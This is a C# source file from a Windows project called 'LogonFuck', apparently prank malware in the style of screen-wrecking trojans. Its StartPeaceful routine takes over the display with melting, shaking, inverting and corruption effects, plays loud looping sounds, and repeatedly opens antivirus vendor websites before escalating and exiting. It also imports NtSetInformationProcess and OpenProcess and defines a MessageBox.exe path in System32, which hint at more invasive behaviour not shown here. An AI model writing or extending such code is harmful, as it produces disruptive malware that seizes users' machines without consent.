using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using System.Media;
using LogonFuck.Properties;
using System.Drawing;
using System.Runtime.InteropServices;

namespace LogonFuck
{
    static class Program
    {

        public static string msgboxPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\System32\MessageBox.exe";
        private static readonly int delay = 15000;
        public static RandomDrawer randomDrawer = new RandomDrawer(400, CopyPixelOperation.SourceCopy);
        public static ShakeDrawer shakeDrawer = new ShakeDrawer(40, 10, true);
        public static CorruptionDrawer corruptionDrawer = new CorruptionDrawer(0);
        public static InverseDrawer inverseDrawer = new InverseDrawer(400, 50, CopyPixelOperation.DestinationInvert);
        public static MeltDrawer meltDrawer = new MeltDrawer(5);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hHandle);

        [Flags]
        public enum ProcessAccessFlag : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(ProcessAccessFlag processAccess, bool bInheritHandle, int processId);


        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        /// <summary>
        /// Punto di ingresso principale dell'applicazione.
        /// </summary>
        [STAThread]
        static void Main()
        {
            if (IsWindows7())
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new MainForm());
            }
            else
            {
               
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    Application.Run(new MainForm());
                
            }
        }

        public static bool IsWindows7()
        {
            try
            {
                RegistryKey ntCurrentVersion = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
                string productName = (string)ntCurrentVersion.GetValue("ProductName");
                ntCurrentVersion.Dispose();
                return productName.StartsWith("Windows 7", StringComparison.OrdinalIgnoreCase);
            } catch
            {
                return false;
            }
        }

        public static void StartPeaceful()
        {   
            SoundPlayer soundPlayer;

            // horizontal melt
            meltDrawer.Start();
            soundPlayer = new SoundPlayer(Resources.crazysound1);
            soundPlayer.PlayLooping();
            Process.Start("https://kaspersky.com");

            Thread.Sleep(delay);

            // shake
            meltDrawer.Stop();
            shakeDrawer.Start();
            soundPlayer.Stop();
            soundPlayer = new SoundPlayer(Resources.crazysound2);
            soundPlayer.Play();
            Process.Start("https://www.norton.com");

            Thread.Sleep(delay);

            // inverse
            shakeDrawer.Stop();
            inverseDrawer.Start();
            soundPlayer.Stop();
            soundPlayer = new SoundPlayer(Resources.crazysound3);
            soundPlayer.Play();
            Process.Start("https://www.avg.com");

            Thread.Sleep(delay);

            // expansion
            inverseDrawer.Stop();
            corruptionDrawer.Start();
            soundPlayer.Stop();
            soundPlayer = new SoundPlayer(Resources.crazysound4);
            soundPlayer.Play();
            Process.Start("https://www.malwarebytes.com");

            Thread.Sleep(delay);

            // random
            corruptionDrawer.Stop();
            randomDrawer.Start();
            soundPlayer.Stop();
            soundPlayer = new SoundPlayer(Resources.crazysound5);
            soundPlayer.Play();
            Process.Start("https://www.avira.com");

            Thread.Sleep(delay);

            // all
            inverseDrawer.delay = 200;
            inverseDrawer.strenght = 100;
            inverseDrawer.Start();
            randomDrawer.delay = 250;
            randomDrawer.dwRop = CopyPixelOperation.SourceAnd;
            corruptionDrawer.Start();
            meltDrawer.delay = 3;
            meltDrawer.Start();
            shakeDrawer.delay = 25;
            shakeDrawer.Start();
            soundPlayer.Stop();
            soundPlayer = new SoundPlayer(Resources.crazysound6);
            soundPlayer.Play();
            Process.Start("https://www.mcafee.com");

            Thread.Sleep(delay);

            // blackness
            randomDrawer.delay = 150;
            shakeDrawer.delay = 10;
            shakeDrawer.strenght = 30;
            inverseDrawer.delay = 20;
            inverseDrawer.dwRop = CopyPixelOperation.SourceInvert;
            meltDrawer.delay = 1;
            soundPlayer.Stop();
            soundPlayer = new SoundPlayer(Resources.crazysound7);
            soundPlayer.Play();
            Process.Start("https://www.bitdefender.com");

            Thread.Sleep(delay);

            Process.GetCurrentProcess().Kill();
        }      
    }
}
